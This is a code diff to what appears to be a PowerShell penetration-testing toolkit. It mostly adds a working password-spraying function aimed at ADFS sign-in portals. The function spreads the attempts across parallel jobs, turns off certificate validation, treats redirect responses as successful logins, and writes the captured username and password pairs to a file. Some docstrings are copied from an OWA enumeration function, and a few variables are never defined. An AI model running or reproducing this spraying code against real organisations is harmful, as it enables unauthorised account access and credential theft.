@@ -1813,12 +1813,14 @@ Param(
         }      
 }
 
-if ($OutFile -ne "")
-  {
-      $FoundedCreds = Get-Content $OutFile | Measure-Object
-      Write-Host ("[*] A total of " + $FoundedCreds.Count + " credentials were obtained.")
-      Write-Output "Results have been written to $OutFile."
-  }
+    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
+    if ($OutFile -ne "")
+    {
+        $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
+        $fullresults = $fullresults -replace " Password:", ":"
+        $fullresults | Out-File -Encoding ascii $OutFile
+        Write-Output "Results have been written to $OutFile."
+    }
 }
 
 function Read-MsftLoginTokens {
@@ -1841,7 +1843,7 @@ function Read-MsftLoginTokens {
 
   Function: Read-MsftLoginTokens
   Author: Dwight Hohnstein (@djhohnstein)
-  Modify by: Michael
+  Modified by: Michael
   License: MIT
   Required Dependencies: PowerShell 3.0 or above.
   Optional Dependencies: None
@@ -2129,12 +2131,14 @@ Param(
       }      
   }
 
-  if ($OutFile -ne "")
-  {
-      $FoundedCreds = Get-Content $OutFile | Measure-Object
-      Write-Host ("[*] A total of " + $FoundedCreds.Count + " credentials were obtained.")
-      Write-Output "Results have been written to $OutFile."
-  }
+    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
+    if ($OutFile -ne "")
+    {
+        $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
+        $fullresults = $fullresults -replace " Password:", ":"
+        $fullresults | Out-File -Encoding ascii $OutFile
+        Write-Output "Results have been written to $OutFile."
+    }
 }
 
 function Invoke-UserEnumeration365{
@@ -2339,6 +2343,236 @@ function Invoke-UserEnumeration365{
           Write-Output "Results have been written to $OutFile."
       }
   }
+
+function Invoke-PasswordSprayADFS{
+
+<#
+  .SYNOPSIS
+
+    This module will passwords against ADFS portal.
+
+    MailSniper Function: Invoke-PasswordSprayADFS
+    Author: Michael 
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+    .DESCRIPTION
+
+        This module will Enumeration users against 365 Outlook Web Access portal.
+
+    .PARAMETER OutFile
+
+        Outputs the results to a text file.
+
+    .PARAMETER UserList
+
+        List of usernames 1 per line to to attempt to password spray against.
+
+    .PARAMETER Threads
+       
+        Number of password spraying threads to run.
+    
+    
+    .PARAMETER Domain
+
+        Specify an Domain
+    
+    .PARAMETER Status
+
+        Display the current user that the password spray is attempting.
+
+  .EXAMPLE
+
+    C:\PS> Invoke-PasswordSprayADFS -UserList .\userlist.txt -Domain exmaple.com -password Summer2019! -Threads 15 -OutFile owa-users.txt
+
+    Description
+    -----------
+    This command will connect to the Office 365 Outlook Web Access server and attempt to enumeration usernames with 15 threads and write to a file called owa-users.txt.
+
+#>
+Param(
+    [Parameter(Position = 0, Mandatory = $False)][string]$OutFile = "",
+    [Parameter(Position = 1, Mandatory = $False)][string]$UserList = "",
+    [Parameter(Position = 2, Mandatory = $False)][string]$Password = "",
+    [Parameter(Position = 3, Mandatory = $False)][string]$Domain = "",
+    [Parameter(Position = 4, Mandatory = $False)][string]$Threads = "5",
+    [Parameter(Position = 5, Mandatory = $False)][string]$URL = "",
+    [Parameter(Position = 6, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "N"
+) 
+
+    Write-Host -ForegroundColor "yellow" "[*] Now spraying password against ADFS"
+    $currenttime = Get-Date
+    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
+
+    if ($UserList -eq "")
+        {
+            Write-Error "Invalid number of arguments given. Require -UserList"
+            break
+        }
+    
+    if ($URL -eq "")
+        {
+            Write-Error "Invalid number of arguments given. Require -URL"
+            break
+        }
+
+    if ($Password -eq "")
+    {
+        Write-Error "Invalid number of arguments given. Require -Password"
+        break
+    }
+    if(Test-Path $Password)
+        {
+            $PwdList = Get-Content $Password
+        }
+    else
+        {
+            $PwdList = $Password
+        }  
+
+    $Usernames = Get-Content $UserList
+    $count = $Usernames.count
+    $userlists = @{}
+    $count = 0 
+    $FailedCount = 0
+ 
+    # Populate the Email/Password Lists
+    $Usernames | ForEach-Object {$userlists[$count % $Threads] += @($_);$count++}
+    
+    $uri = "https://$URL/adfs/ls/idpinitiatedsignon?client-request-id="
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Host", "$URL")
+    $headers.Add("Origin", "https://$URL")
+    $headers.Add("Upgrade-Insecure-Requests", "1")
+    $headers.Add("Content-Type", "application/x-www-form-urlencoded")
+    $headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0")
+    $headers.Add("Accept", "application/x-www-form-urlencoded")
+    $headers.Add("Accept-Encoding", "gzip, deflate")
+    $headers.Add("Accept-Language", "en-US,en;q=0.5")
+    
+    
+    foreach ($Password in $PwdList) 
+    {
+    write-Host -ForegroundColor Red "[*] Spraying password $Password"
+
+        if($FailedAttempts -le ($FailedCount/$Threads))
+        {
+            if($Waittime -ge 1)
+            {
+                $currenttime = Get-Date
+                write-Host "[*] Sleeping for $Waittime minutes - Current date and time: $currenttime"
+                Start-Sleep -Seconds ($Waittime*60)
+                $FailedCount = 0
+            }  
+        }
+
+    0..($Threads - 1) | % {
+          
+            Start-Job -ScriptBlock {
+                
+                $Password = $args[1]
+                $Domain = $args[2]
+                $uri = $args[3]
+                $headers = $args[4]
+                $Status =  $args[5]             
+                foreach ($Username in $args[0]) 
+                    {
+                        $RequestID = New-Guid
+                        #Enumeration users in ADFS Portal
+                        
+                        if ($Status -eq 'Y')
+                        {
+                            write-host "`t Current User: $Username"
+                        }
+
+                        $ProgressPreference = 'silentlycontinue'
+                        if ($Domain -ne "")
+                            {
+                                $Username = ("$Domain" + "\" + "$Username")
+                            }
+
+                        add-type @"
+                            using System.Net;
+                            using System.Security.Cryptography.X509Certificates;
+                            public class TrustAllCertsPolicy : ICertificatePolicy {
+                                public bool CheckValidationResult(
+                                    ServicePoint srvPoint, X509Certificate certificate,
+                                    WebRequest request, int certificateProblem) {
+                                    return true;
+                                }
+                            }
+"@
+                        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+                        $SessionData = Invoke-WebRequest -Uri $($uri+$RequestID) -SessionVariable session -Method POST -Body "SignInIdpSite=SignInIdpSite&SignInSubmit=Sign+in&SingleSignOut=SingleSignOut"
+
+                        $PostDataStage = @{
+                            UserName = $Username
+                            Password = $Password
+                            AuthMethod = "FormsAuthentication"
+                        } 
+                        $ADFSRequest = Invoke-WebRequest -Uri $($uri+$RequestID) -Headers $headers -Method POST -Body $PostDataStage -WebSession $session -MaximumRedirection 0 -ErrorAction SilentlyContinue 
+                        if ($ADFSRequest.StatusCode -contains "302")
+                            {
+                                Write-Output "[*] SUCCESS! User:$Username Password:$Password"
+                            }                       
+                      }
+    
+                    $curr_user+=1
+                    
+            } -ArgumentList $userlists[$_], $Password, $Domain, $uri, $headers,$Status | Out-Null
+    }
+    
+    $Complete = Get-Date
+    $MaxWaitAtEnd = 10000
+    $SleepTimer = 200
+    $FullResults = @()
+    While($(Get-Job -State Running).Count -gt 0)
+        {
+            $RunningJobs = ""
+            ForEach($Job in $(Get-Job -State Running))
+                {
+                    $RunningJobs += ", $($Job.name)"
+                }       
+
+            $RunningJobs = $RunningJobs.Substring(2)
+            Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+            if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+                {
+                    Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                    Get-Job -State Running | Remove-Job -Force
+                }
+            else
+            {
+                Start-Sleep -Milliseconds $SleepTimer
+                ForEach($Job in Get-Job)
+                {
+                    $JobOutput = Receive-Job $Job
+                    if ($JobOutput)
+                    {
+                        Write-Host -ForegroundColor "green" $JobOutput
+                        $FullResults += $JobOutput                   
+                        if ($OutFile -ne "")
+                            {
+                                Write-Verbose "Writing results to $OutFile"
+                                $FullResults | Out-File -Encoding ascii -Append $OutFile
+                            } 
+                    }
+                }
+            }
+        }      
+    }
+       
+    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
+    if ($OutFile -ne "")
+    {
+        $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
+        $fullresults = $fullresults -replace " Password:", ":"
+        $fullresults | Out-File -Encoding ascii $OutFile
+        Write-Output "Results have been written to $OutFile."
+    }
+}
+
 function Invoke-PasswordSprayEWS{
 
 <#
